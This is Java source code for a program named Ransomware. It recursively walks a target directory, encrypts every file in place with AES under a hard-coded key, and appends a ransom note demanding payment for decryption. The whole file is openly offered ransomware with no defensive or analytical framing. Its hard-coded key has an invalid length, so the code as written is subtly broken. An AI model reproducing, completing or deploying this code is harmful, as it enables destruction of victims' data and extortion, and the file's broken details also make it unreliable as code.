import java.io.File;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardOpenOption;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Ransomware {

    private static final String ENCRYPTION_ALGORITHM = "AES";
    private static final String SECRET_KEY = "YourSecretKey";

    public static void main(String[] args) {
        // Specify the target directory to encrypt
        String targetDirectoryPath = "C:/TargetDirectory";

        // Encrypt files in the target directory
        encryptFiles(new File(targetDirectoryPath));
    }

    private static void encryptFiles(File directory) {
        File[] files = directory.listFiles();

        if (files != null) {
            for (File file : files) {
                if (file.isDirectory()) {
                    encryptFiles(file); // Recursively encrypt files in subdirectories
                } else {
                    encryptFile(file); // Encrypt individual file
                }
            }
        }
    }

    private static void encryptFile(File file) {
        try {
            byte[] fileContent = Files.readAllBytes(file.toPath());

            // Create secret key
            SecretKeySpec secretKey = new SecretKeySpec(SECRET_KEY.getBytes(), ENCRYPTION_ALGORITHM);

            // Initialize cipher
            Cipher cipher = Cipher.getInstance(ENCRYPTION_ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey);

            // Encrypt file content
            byte[] encryptedContent = cipher.doFinal(fileContent);

            // Write encrypted content back to the file
            Path filePath = file.toPath();
            Files.write(filePath, encryptedContent, StandardOpenOption.TRUNCATE_EXISTING);

            // Generate and write ransom note to the file
            String ransomNote = "Your files have been encrypted. Pay the ransom to receive the decryption key.";
            Files.write(filePath, ransomNote.getBytes(), StandardOpenOption.APPEND);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}